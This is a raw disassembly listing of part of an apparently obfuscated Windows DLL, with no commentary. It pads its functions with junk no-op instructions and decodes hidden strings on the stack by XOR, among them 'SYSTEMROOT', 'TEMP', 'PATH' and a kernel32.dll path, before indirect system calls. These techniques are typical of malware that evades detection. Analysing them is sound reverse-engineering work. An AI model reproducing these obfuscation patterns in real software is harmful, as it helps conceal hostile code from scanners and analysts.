   1800039cd:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800039d1:	48 87 e4             	xchg   %rsp,%rsp
   1800039d4:	41 58                	pop    %r8
   1800039d6:	48 87 c9             	xchg   %rcx,%rcx
   1800039d9:	48 8d 36             	lea    (%rsi),%rsi
   1800039dc:	4d 89 c0             	mov    %r8,%r8
   1800039df:	4d 8d 09             	lea    (%r9),%r9
   1800039e2:	e8 59 dc ff ff       	call   0x180001640
   1800039e7:	c7 44 24 30 b4 e7 79 	movl   $0x79e7b4,0x30(%rsp)
   1800039ee:	00 
   1800039ef:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800039f3:	48 89 db             	mov    %rbx,%rbx
   1800039f6:	90                   	nop
   1800039f7:	41 52                	push   %r10
   1800039f9:	41 5a                	pop    %r10
   1800039fb:	31 c0                	xor    %eax,%eax
   1800039fd:	48 83 c4 48          	add    $0x48,%rsp
   180003a01:	c3                   	ret
   180003a02:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180003a09:	1f 84 00 00 00 00 00 
   180003a10:	56                   	push   %rsi
   180003a11:	57                   	push   %rdi
   180003a12:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   180003a19:	b9 3b 03 00 00       	mov    $0x33b,%ecx
   180003a1e:	e8 6d e2 ff ff       	call   0x180001c90
   180003a23:	41 52                	push   %r10
   180003a25:	56                   	push   %rsi
   180003a26:	5e                   	pop    %rsi
   180003a27:	41 5a                	pop    %r10
   180003a29:	48 8d 0d 96 d0 01 00 	lea    0x1d096(%rip),%rcx        # 0x180020ac6
   180003a30:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180003a35:	ba 04 01 00 00       	mov    $0x104,%edx
   180003a3a:	45 31 c9             	xor    %r9d,%r9d
   180003a3d:	ff 15 dd 07 02 00    	call   *0x207dd(%rip)        # 0x180024220
   180003a43:	55                   	push   %rbp
   180003a44:	48 8d 09             	lea    (%rcx),%rcx
   180003a47:	4d 89 e4             	mov    %r12,%r12
   180003a4a:	5d                   	pop    %rbp
   180003a4b:	41 54                	push   %r12
   180003a4d:	41 5c                	pop    %r12
   180003a4f:	e8 ac dd ff ff       	call   0x180001800
   180003a54:	41 51                	push   %r9
   180003a56:	41 59                	pop    %r9
   180003a58:	e8 e3 de ff ff       	call   0x180001940
   180003a5d:	c7 44 24 50 68 00 00 	movl   $0x68,0x50(%rsp)
   180003a64:	00 
   180003a65:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003a6a:	ff 15 18 08 02 00    	call   *0x20818(%rip)        # 0x180024288
   180003a70:	e8 4b e2 ff ff       	call   0x180001cc0
   180003a75:	c7 44 24 50 1e 3b 81 	movl   $0x813b1e,0x50(%rsp)
   180003a7c:	00 
   180003a7d:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003a81:	4d 89 ff             	mov    %r15,%r15
   180003a84:	90                   	nop
   180003a85:	e8 b6 db ff ff       	call   0x180001640
   180003a8a:	4d 87 ff             	xchg   %r15,%r15
   180003a8d:	90                   	nop
   180003a8e:	4d 8d 36             	lea    (%r14),%r14
   180003a91:	b9 ca 02 00 00       	mov    $0x2ca,%ecx
   180003a96:	e8 a5 df ff ff       	call   0x180001a40
   180003a9b:	90                   	nop
   180003a9c:	48 87 d2             	xchg   %rdx,%rdx
   180003a9f:	90                   	nop
   180003aa0:	90                   	nop
   180003aa1:	e8 da d8 ff ff       	call   0x180001380
   180003aa6:	48 8b 35 fb 07 02 00 	mov    0x207fb(%rip),%rsi        # 0x1800242a8
   180003aad:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003ab2:	ff d6                	call   *%rsi
   180003ab4:	57                   	push   %rdi
   180003ab5:	41 51                	push   %r9
   180003ab7:	41 59                	pop    %r9
   180003ab9:	5f                   	pop    %rdi
   180003aba:	e8 41 dd ff ff       	call   0x180001800
   180003abf:	c7 44 24 2c 72 00 00 	movl   $0x72,0x2c(%rsp)
   180003ac6:	00 
   180003ac7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003acb:	83 f0 21             	xor    $0x21,%eax
   180003ace:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180003ad3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003ad7:	83 f0 2b             	xor    $0x2b,%eax
   180003ada:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180003adf:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003ae3:	83 f0 21             	xor    $0x21,%eax
   180003ae6:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180003aeb:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003aef:	83 f0 26             	xor    $0x26,%eax
   180003af2:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180003af7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003afb:	83 f0 37             	xor    $0x37,%eax
   180003afe:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180003b03:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b07:	83 f0 3f             	xor    $0x3f,%eax
   180003b0a:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180003b0f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b13:	83 f0 20             	xor    $0x20,%eax
   180003b16:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180003b1b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b1f:	83 f0 3d             	xor    $0x3d,%eax
   180003b22:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180003b27:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b2b:	83 f0 3d             	xor    $0x3d,%eax
   180003b2e:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180003b33:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b37:	83 f0 26             	xor    $0x26,%eax
   180003b3a:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180003b3f:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   180003b46:	48 8b 3d bb 06 02 00 	mov    0x206bb(%rip),%rdi        # 0x180024208
   180003b4d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003b52:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003b57:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003b5d:	ff d7                	call   *%rdi
   180003b5f:	90                   	nop
   180003b60:	48 89 e4             	mov    %rsp,%rsp
   180003b63:	51                   	push   %rcx
   180003b64:	4d 8d 24 24          	lea    (%r12),%r12
   180003b68:	4d 87 c0             	xchg   %r8,%r8
   180003b6b:	59                   	pop    %rcx
   180003b6c:	c7 44 24 2c 4e 00 00 	movl   $0x4e,0x2c(%rsp)
   180003b73:	00 
   180003b74:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b78:	83 f0 1a             	xor    $0x1a,%eax
   180003b7b:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180003b80:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b84:	83 f0 0b             	xor    $0xb,%eax
   180003b87:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180003b8c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b90:	83 f0 03             	xor    $0x3,%eax
   180003b93:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180003b98:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003b9c:	83 f0 1e             	xor    $0x1e,%eax
   180003b9f:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180003ba4:	66 c7 44 24 38 00 00 	movw   $0x0,0x38(%rsp)
   180003bab:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003bb0:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003bb5:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003bbb:	ff d7                	call   *%rdi
   180003bbd:	4d 89 ff             	mov    %r15,%r15
   180003bc0:	4d 87 db             	xchg   %r11,%r11
   180003bc3:	53                   	push   %rbx
   180003bc4:	51                   	push   %rcx
   180003bc5:	59                   	pop    %rcx
   180003bc6:	5b                   	pop    %rbx
   180003bc7:	c7 44 24 30 91 00 00 	movl   $0x91,0x30(%rsp)
   180003bce:	00 
   180003bcf:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003bd3:	35 d2 00 00 00       	xor    $0xd2,%eax
   180003bd8:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   180003bdd:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003be1:	35 ab 00 00 00       	xor    $0xab,%eax
   180003be6:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180003beb:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003bef:	35 cd 00 00 00       	xor    $0xcd,%eax
   180003bf4:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180003bf9:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003bfd:	35 c6 00 00 00       	xor    $0xc6,%eax
   180003c02:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180003c07:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c0b:	35 f8 00 00 00       	xor    $0xf8,%eax
   180003c10:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   180003c15:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c19:	35 ff 00 00 00       	xor    $0xff,%eax
   180003c1e:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
   180003c23:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c27:	35 f5 00 00 00       	xor    $0xf5,%eax
   180003c2c:	66 89 44 24 5c       	mov    %ax,0x5c(%rsp)
   180003c31:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c35:	35 fe 00 00 00       	xor    $0xfe,%eax
   180003c3a:	66 89 44 24 5e       	mov    %ax,0x5e(%rsp)
   180003c3f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c43:	35 e6 00 00 00       	xor    $0xe6,%eax
   180003c48:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   180003c4d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c51:	35 e2 00 00 00       	xor    $0xe2,%eax
   180003c56:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   180003c5b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c5f:	35 cd 00 00 00       	xor    $0xcd,%eax
   180003c64:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   180003c69:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c6d:	35 c2 00 00 00       	xor    $0xc2,%eax
   180003c72:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180003c77:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c7b:	35 e8 00 00 00       	xor    $0xe8,%eax
   180003c80:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   180003c85:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c89:	35 e2 00 00 00       	xor    $0xe2,%eax
   180003c8e:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   180003c93:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003c97:	35 e5 00 00 00       	xor    $0xe5,%eax
   180003c9c:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   180003ca1:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003ca5:	35 f4 00 00 00       	xor    $0xf4,%eax
   180003caa:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180003caf:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003cb3:	35 fc 00 00 00       	xor    $0xfc,%eax
   180003cb8:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   180003cbd:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003cc1:	35 a2 00 00 00       	xor    $0xa2,%eax
   180003cc6:	66 89 44 24 72       	mov    %ax,0x72(%rsp)
   180003ccb:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003ccf:	35 a3 00 00 00       	xor    $0xa3,%eax
   180003cd4:	66 89 44 24 74       	mov    %ax,0x74(%rsp)
   180003cd9:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003cdd:	35 cd 00 00 00       	xor    $0xcd,%eax
   180003ce2:	66 89 44 24 76       	mov    %ax,0x76(%rsp)
   180003ce7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003ceb:	35 fa 00 00 00       	xor    $0xfa,%eax
   180003cf0:	66 89 44 24 78       	mov    %ax,0x78(%rsp)
   180003cf5:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003cf9:	35 f4 00 00 00       	xor    $0xf4,%eax
   180003cfe:	66 89 44 24 7a       	mov    %ax,0x7a(%rsp)
   180003d03:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d07:	35 e3 00 00 00       	xor    $0xe3,%eax
   180003d0c:	66 89 44 24 7c       	mov    %ax,0x7c(%rsp)
   180003d11:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d15:	35 ff 00 00 00       	xor    $0xff,%eax
   180003d1a:	66 89 44 24 7e       	mov    %ax,0x7e(%rsp)
   180003d1f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d23:	35 f4 00 00 00       	xor    $0xf4,%eax
   180003d28:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   180003d2f:	00 
   180003d30:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d34:	35 fd 00 00 00       	xor    $0xfd,%eax
   180003d39:	66 89 84 24 82 00 00 	mov    %ax,0x82(%rsp)
   180003d40:	00 
   180003d41:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d45:	35 a2 00 00 00       	xor    $0xa2,%eax
   180003d4a:	66 89 84 24 84 00 00 	mov    %ax,0x84(%rsp)
   180003d51:	00 
   180003d52:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d56:	35 a3 00 00 00       	xor    $0xa3,%eax
   180003d5b:	66 89 84 24 86 00 00 	mov    %ax,0x86(%rsp)
   180003d62:	00 
   180003d63:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d67:	35 bf 00 00 00       	xor    $0xbf,%eax
   180003d6c:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   180003d73:	00 
   180003d74:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d78:	35 f5 00 00 00       	xor    $0xf5,%eax
   180003d7d:	66 89 84 24 8a 00 00 	mov    %ax,0x8a(%rsp)
   180003d84:	00 
   180003d85:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d89:	35 fd 00 00 00       	xor    $0xfd,%eax
   180003d8e:	66 89 84 24 8c 00 00 	mov    %ax,0x8c(%rsp)
   180003d95:	00 
   180003d96:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003d9a:	35 fd 00 00 00       	xor    $0xfd,%eax
   180003d9f:	66 89 84 24 8e 00 00 	mov    %ax,0x8e(%rsp)
   180003da6:	00 
   180003da7:	66 c7 84 24 90 00 00 	movw   $0x0,0x90(%rsp)
   180003dae:	00 00 00 
   180003db1:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003db6:	ff 15 54 04 02 00    	call   *0x20454(%rip)        # 0x180024210
   180003dbc:	4d 87 db             	xchg   %r11,%r11
   180003dbf:	c7 44 24 50 5a f1 a2 	movl   $0xa2f15a,0x50(%rsp)
   180003dc6:	00 
   180003dc7:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003dcb:	41 51                	push   %r9
   180003dcd:	53                   	push   %rbx
   180003dce:	5b                   	pop    %rbx
   180003dcf:	41 59                	pop    %r9
   180003dd1:	41 52                	push   %r10
   180003dd3:	4d 8d 1b             	lea    (%r11),%r11
   180003dd6:	41 5a                	pop    %r10
   180003dd8:	b9 dc 02 00 00       	mov    $0x2dc,%ecx
   180003ddd:	e8 1e df ff ff       	call   0x180001d00
   180003de2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003de7:	ff d6                	call   *%rsi
   180003de9:	51                   	push   %rcx
   180003dea:	59                   	pop    %rcx
   180003deb:	48 87 c9             	xchg   %rcx,%rcx
   180003dee:	4d 87 ed             	xchg   %r13,%r13
   180003df1:	48 89 ff             	mov    %rdi,%rdi
   180003df4:	4d 87 ff             	xchg   %r15,%r15
   180003df7:	e8 04 db ff ff       	call   0x180001900
   180003dfc:	48 8d 0d b1 cc 01 00 	lea    0x1ccb1(%rip),%rcx        # 0x180020ab4
   180003e03:	ff 15 6f 05 02 00    	call   *0x2056f(%rip)        # 0x180024378
   180003e09:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003e0e:	ff 15 6c 05 02 00    	call   *0x2056c(%rip)        # 0x180024380
   180003e14:	48 89 d2             	mov    %rdx,%rdx
   180003e17:	48 87 d2             	xchg   %rdx,%rdx
   180003e1a:	90                   	nop
   180003e1b:	48 87 e4             	xchg   %rsp,%rsp
   180003e1e:	4d 87 d2             	xchg   %r10,%r10
   180003e21:	4d 89 c0             	mov    %r8,%r8
   180003e24:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003e28:	48 87 db             	xchg   %rbx,%rbx
   180003e2b:	31 c9                	xor    %ecx,%ecx
   180003e2d:	ff 15 2d 04 02 00    	call   *0x2042d(%rip)        # 0x180024260
   180003e33:	41 51                	push   %r9
   180003e35:	41 59                	pop    %r9
   180003e37:	90                   	nop
   180003e38:	48 89 ed             	mov    %rbp,%rbp
   180003e3b:	e8 10 df ff ff       	call   0x180001d50
   180003e40:	c7 44 24 50 8b 48 af 	movl   $0xaf488b,0x50(%rsp)
   180003e47:	00 
   180003e48:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003e4c:	56                   	push   %rsi
   180003e4d:	90                   	nop
   180003e4e:	5e                   	pop    %rsi
   180003e4f:	e8 3c e0 ff ff       	call   0x180001e90
   180003e54:	41 50                	push   %r8
   180003e56:	90                   	nop
   180003e57:	41 58                	pop    %r8
   180003e59:	48 89 e4             	mov    %rsp,%rsp
   180003e5c:	90                   	nop
   180003e5d:	4d 89 ed             	mov    %r13,%r13
   180003e60:	48 89 c9             	mov    %rcx,%rcx
   180003e63:	90                   	nop
   180003e64:	4d 89 c0             	mov    %r8,%r8
   180003e67:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003e6c:	ff 15 16 05 02 00    	call   *0x20516(%rip)        # 0x180024388
   180003e72:	0f b6 44 24 50       	movzbl 0x50(%rsp),%eax
   180003e77:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   180003e7e:	5f                   	pop    %rdi
   180003e7f:	5e                   	pop    %rsi
   180003e80:	c3                   	ret
   180003e81:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180003e88:	0f 1f 84 00 00 00 00 
   180003e8f:	00 
   180003e90:	56                   	push   %rsi
   180003e91:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   180003e98:	b9 d1 01 00 00       	mov    $0x1d1,%ecx
   180003e9d:	e8 8e e5 ff ff       	call   0x180002430
   180003ea2:	ff 15 f8 02 02 00    	call   *0x202f8(%rip)        # 0x1800241a0
   180003ea8:	4d 87 d2             	xchg   %r10,%r10
   180003eab:	90                   	nop
   180003eac:	41 53                	push   %r11
   180003eae:	48 89 db             	mov    %rbx,%rbx
   180003eb1:	41 5b                	pop    %r11
   180003eb3:	c7 44 24 40 81 00 00 	movl   $0x81,0x40(%rsp)
   180003eba:	00 
   180003ebb:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003ebf:	35 d1 00 00 00       	xor    $0xd1,%eax
   180003ec4:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180003ec9:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003ecd:	35 c0 00 00 00       	xor    $0xc0,%eax
   180003ed2:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   180003ed7:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003edb:	35 d5 00 00 00       	xor    $0xd5,%eax
   180003ee0:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   180003ee5:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003ee9:	35 c9 00 00 00       	xor    $0xc9,%eax
   180003eee:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   180003ef3:	66 c7 44 24 4e 00 00 	movw   $0x0,0x4e(%rsp)
   180003efa:	48 8d 4c 24 46       	lea    0x46(%rsp),%rcx
   180003eff:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003f04:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003f0a:	ff 15 f8 02 02 00    	call   *0x202f8(%rip)        # 0x180024208
   180003f10:	48 8d 15 ab cb 01 00 	lea    0x1cbab(%rip),%rdx        # 0x180020ac2
   180003f17:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   180003f1c:	b9 01 00 00 00       	mov    $0x1,%ecx
   180003f21:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180003f27:	49 89 f1             	mov    %rsi,%r9
   180003f2a:	ff 15 68 03 02 00    	call   *0x20368(%rip)        # 0x180024298
   180003f30:	56                   	push   %rsi
   180003f31:	41 57                	push   %r15
   180003f33:	41 5f                	pop    %r15
   180003f35:	5e                   	pop    %rsi
   180003f36:	e8 85 dd ff ff       	call   0x180001cc0
   180003f3b:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003f3e:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   180003f43:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003f48:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180003f4f:	00 
   180003f50:	4c 8d 05 5f cb 01 00 	lea    0x1cb5f(%rip),%r8        # 0x180020ab6
   180003f57:	31 c9                	xor    %ecx,%ecx
   180003f59:	31 d2                	xor    %edx,%edx
   180003f5b:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180003f61:	ff 15 c1 04 02 00    	call   *0x204c1(%rip)        # 0x180024428
   180003f67:	41 55                	push   %r13
   180003f69:	52                   	push   %rdx
   180003f6a:	5a                   	pop    %rdx
   180003f6b:	41 5d                	pop    %r13
   180003f6d:	48 89 c0             	mov    %rax,%rax
   180003f70:	4d 89 e4             	mov    %r12,%r12
   180003f73:	4d 89 ed             	mov    %r13,%r13
   180003f76:	48 87 ff             	xchg   %rdi,%rdi
   180003f79:	4d 87 c0             	xchg   %r8,%r8
   180003f7c:	4d 8d 1b             	lea    (%r11),%r11
   180003f7f:	c7 44 24 50 b0 93 a5 	movl   $0xa593b0,0x50(%rsp)
   180003f86:	00 
   180003f87:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003f8b:	57                   	push   %rdi
   180003f8c:	50                   	push   %rax
   180003f8d:	58                   	pop    %rax
   180003f8e:	5f                   	pop    %rdi
   180003f8f:	b9 ab 02 00 00       	mov    $0x2ab,%ecx
   180003f94:	e8 d7 de ff ff       	call   0x180001e70
   180003f99:	57                   	push   %rdi
   180003f9a:	41 55                	push   %r13
   180003f9c:	41 5d                	pop    %r13
   180003f9e:	5f                   	pop    %rdi
   180003f9f:	e8 ec de ff ff       	call   0x180001e90
   180003fa4:	ff 15 06 02 02 00    	call   *0x20206(%rip)        # 0x1800241b0
   180003faa:	ff 15 40 02 02 00    	call   *0x20240(%rip)        # 0x1800241f0
   180003fb0:	53                   	push   %rbx
   180003fb1:	5b                   	pop    %rbx
   180003fb2:	e8 89 d6 ff ff       	call   0x180001640
   180003fb7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003fbc:	ff 15 ee 02 02 00    	call   *0x202ee(%rip)        # 0x1800242b0
   180003fc2:	48 89 f6             	mov    %rsi,%rsi
   180003fc5:	90                   	nop
   180003fc6:	48 89 c9             	mov    %rcx,%rcx
   180003fc9:	90                   	nop
   180003fca:	c7 44 24 50 85 ec 81 	movl   $0x81ec85,0x50(%rsp)
   180003fd1:	00 
   180003fd2:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003fd6:	90                   	nop
   180003fd7:	48 87 d2             	xchg   %rdx,%rdx
   180003fda:	90                   	nop
   180003fdb:	48 89 f6             	mov    %rsi,%rsi
   180003fde:	90                   	nop
   180003fdf:	90                   	nop
   180003fe0:	90                   	nop
   180003fe1:	4d 89 c0             	mov    %r8,%r8
   180003fe4:	4d 89 f6             	mov    %r14,%r14
   180003fe7:	48 89 ff             	mov    %rdi,%rdi
   180003fea:	48 8d 09             	lea    (%rcx),%rcx
   180003fed:	4d 8d 09             	lea    (%r9),%r9
   180003ff0:	4d 87 e4             	xchg   %r12,%r12
   180003ff3:	90                   	nop
   180003ff4:	41 57                	push   %r15
   180003ff6:	41 5f                	pop    %r15
   180003ff8:	52                   	push   %rdx
   180003ff9:	4d 8d 1b             	lea    (%r11),%r11
   180003ffc:	48 89 e4             	mov    %rsp,%rsp
   180003fff:	5a                   	pop    %rdx
   180004000:	4d 87 c9             	xchg   %r9,%r9
   180004003:	48 87 db             	xchg   %rbx,%rbx
   180004006:	48 8d 00             	lea    (%rax),%rax
   180004009:	b9 06 00 00 00       	mov    $0x6,%ecx
   18000400e:	ff 15 24 03 02 00    	call   *0x20324(%rip)        # 0x180024338
   180004014:	90                   	nop
   180004015:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   18000401c:	5e                   	pop    %rsi
   18000401d:	c3                   	ret
   18000401e:	66 90                	xchg   %ax,%ax
   180004020:	56                   	push   %rsi
   180004021:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   180004028:	b9 49 02 00 00       	mov    $0x249,%ecx
   18000402d:	e8 9e d4 ff ff       	call   0x1800014d0
   180004032:	51                   	push   %rcx
   180004033:	41 54                	push   %r12
   180004035:	41 5c                	pop    %r12
   180004037:	59                   	pop    %rcx
   180004038:	41 52                	push   %r10
   18000403a:	4d 89 db             	mov    %r11,%r11
   18000403d:	41 5a                	pop    %r10
   18000403f:	c7 44 24 30 68 00 00 	movl   $0x68,0x30(%rsp)
   180004046:	00 
   180004047:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000404c:	ff 15 36 02 02 00    	call   *0x20236(%rip)        # 0x180024288
   180004052:	41 50                	push   %r8
   180004054:	48 87 db             	xchg   %rbx,%rbx
   180004057:	41 58                	pop    %r8
   180004059:	ff 15 89 01 02 00    	call   *0x20189(%rip)        # 0x1800241e8
   18000405f:	48 89 c1             	mov    %rax,%rcx
   180004062:	ff 15 58 02 02 00    	call   *0x20258(%rip)        # 0x1800242c0
   180004068:	53                   	push   %rbx
   180004069:	5b                   	pop    %rbx
   18000406a:	90                   	nop
   18000406b:	90                   	nop
   18000406c:	90                   	nop
   18000406d:	b9 00 04 00 00       	mov    $0x400,%ecx
   180004072:	ba 01 00 00 00       	mov    $0x1,%edx
   180004077:	ff 15 cb 02 02 00    	call   *0x202cb(%rip)        # 0x180024348
   18000407d:	48 87 f6             	xchg   %rsi,%rsi
   180004080:	4d 89 ff             	mov    %r15,%r15
   180004083:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004088:	ff 15 da 01 02 00    	call   *0x201da(%rip)        # 0x180024268
   18000408e:	4d 87 db             	xchg   %r11,%r11
   180004091:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004095:	48 8d 09             	lea    (%rcx),%rcx
   180004098:	4d 8d 09             	lea    (%r9),%r9
   18000409b:	4d 87 db             	xchg   %r11,%r11
   18000409e:	4d 87 ff             	xchg   %r15,%r15
   1800040a1:	c7 44 24 30 b7 d7 aa 	movl   $0xaad7b7,0x30(%rsp)
   1800040a8:	00 
   1800040a9:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800040ad:	b9 a5 01 00 00       	mov    $0x1a5,%ecx
   1800040b2:	e8 29 d7 ff ff       	call   0x1800017e0
   1800040b7:	90                   	nop
   1800040b8:	48 8d 36             	lea    (%rsi),%rsi
   1800040bb:	90                   	nop
   1800040bc:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800040c1:	b9 00 04 00 00       	mov    $0x400,%ecx
   1800040c6:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1800040cb:	41 b9 55 00 00 00    	mov    $0x55,%r9d
   1800040d1:	ff 15 61 01 02 00    	call   *0x20161(%rip)        # 0x180024238
   1800040d7:	41 57                	push   %r15
   1800040d9:	4d 8d 12             	lea    (%r10),%r10
   1800040dc:	4d 89 db             	mov    %r11,%r11
   1800040df:	41 5f                	pop    %r15
   1800040e1:	4d 8d 3f             	lea    (%r15),%r15
   1800040e4:	48 89 ff             	mov    %rdi,%rdi
   1800040e7:	48 8d 12             	lea    (%rdx),%rdx
   1800040ea:	ff 15 f0 00 02 00    	call   *0x200f0(%rip)        # 0x1800241e0
   1800040f0:	48 87 e4             	xchg   %rsp,%rsp
   1800040f3:	e8 58 dc ff ff       	call   0x180001d50
   1800040f8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800040fd:	ff 15 85 02 02 00    	call   *0x20285(%rip)        # 0x180024388
   180004103:	41 54                	push   %r12
   180004105:	41 56                	push   %r14
   180004107:	41 5e                	pop    %r14
   180004109:	41 5c                	pop    %r12
   18000410b:	90                   	nop
   18000410c:	48 87 e4             	xchg   %rsp,%rsp
   18000410f:	90                   	nop
   180004110:	e8 6b d2 ff ff       	call   0x180001380
   180004115:	c7 44 24 30 56 42 db 	movl   $0xdb4256,0x30(%rsp)
   18000411c:	00 
   18000411d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004121:	52                   	push   %rdx
   180004122:	4d 87 e4             	xchg   %r12,%r12
   180004125:	5a                   	pop    %rdx
